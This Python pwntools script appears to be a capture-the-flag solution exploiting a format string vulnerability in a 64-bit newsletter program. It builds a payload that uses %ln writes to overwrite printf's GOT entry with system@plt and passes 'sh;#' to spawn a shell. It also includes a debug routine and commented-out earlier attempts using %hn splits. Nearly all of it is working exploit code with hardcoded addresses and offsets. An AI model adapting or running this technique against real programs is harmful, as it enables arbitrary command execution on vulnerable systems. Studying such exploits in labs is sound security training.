#!/usr/bin/env python
from pwn import *


print('3')  # Choose newsletter

def exploit():
	addr_system_plt = 0x04006e0
	addr_system_got = 0x0602040
	addr_printf_got = 0x0602048

	# format string index of the starting of the buffer
	buffer_index = 24

	# we write the shell string here which will be passed
	# to system() function. We follow it by a # to comment
	# out the other stuff so it doesn't not get parsed by shell
	payload = 'sh;#'

	# Calculate how many more bytes to print to reach our
	# write value targetted at the desired function address
	# (subtract the earlier chars already printed out)
	count_to_print = addr_system_plt - len(payload)
	# count_to_print = 0xDEADBEEF  # testing

	# Format string to print bytes (@@ and 00 are placeholders)
	payload += '%@@$00p'.replace('00', str(count_to_print))

	# Format string to write to the address (@@ is a placeholder)
	payload += '%@@$ln'

	# Because we have written some stuff to the buffer,
	# so the index 24 points to what we have written so far.
	# We need to calculate the new buffer index which points
	# to the address
	payload_add_index = 3
	buffer_index += payload_add_index
	assert (len(payload) <= (payload_add_index * 8))

	# Here, we will replace the placeholder @@ with the buffer index
	payload = payload.replace('@@', str(buffer_index))

	# We want to make the prior payload string to multiples
	# of 8 bytes. This is so our address will be aligned nicely
	payload = payload.ljust(payload_add_index * 8)
	
	# Finally, write the target address at index 28
	payload += p64(addr_printf_got)  # index 28

	print(payload)
	print('Y')  # Is this correct? [Y/n]

exploit()


def debug():
	# make it padded to 8 byte lengths
	payload = 'ls;#'.ljust(8)  # index 25

	# subtract the earlier chars already printed out
	count_to_print = addr_system_got - len(payload)

	#payload += '%00x'.replace('00', str(count_to_print).zfill(8-2))  # index 26
	payload += '%00x'.replace('00', str(count_to_print).zfill(8-2))  # index 26
	#payload += '%00x'.replace('00', str(10)).ljust(8)  # index 26

	# write to the address in buffer (index 27)
	#payload += '%27$n'.ljust(8)  # index 27
	#payload += p64(addr_printf_got)  # index 28
	payload += '%27$n'.ljust(8)  # index 27
	payload += p64(0xAABBCCDDAABBCCDD)
	payload += '@%27$016p@'.ljust(8)  # index 27

	#payload += '%28$016p'.ljust(8)  # index 27
	#payload += p64(addr_printf_got)  # index 28
	
	#payload += p64(0xAABBCCDDAABBCCDD)
	#payload += '-24=%24$016p'
	#payload += '-25=%25$016p'
	#payload += '-26=%26$016p'
	#payload += '-27=%27$016p'
	#payload += '-28=%28$016p'


########################################################################
# Old code: does not work because 64-bit address have NULL bytes in them
'''	
# split it into 2x `%hn`, 0x0040 and 0x06e0
# subtract the earlier chars already printed out
payload += '%00x'.replace('00', str(0x40 - len(payload)))

# write to the 25th index, which is the first address in buffer
payload += '%25$hn'

# 0x40 has been printed so far, so print more to get 0x06e0
payload += '%00x'.replace('00', str(0x06e0 - 0x40))

# write to the 26th index, which is the second address in buffer
payload += '%26$hn'

# write upper first before lower
payload += p64(0x0602048+2)  # index 25
payload += p64(0x0602048)  # index 26
'''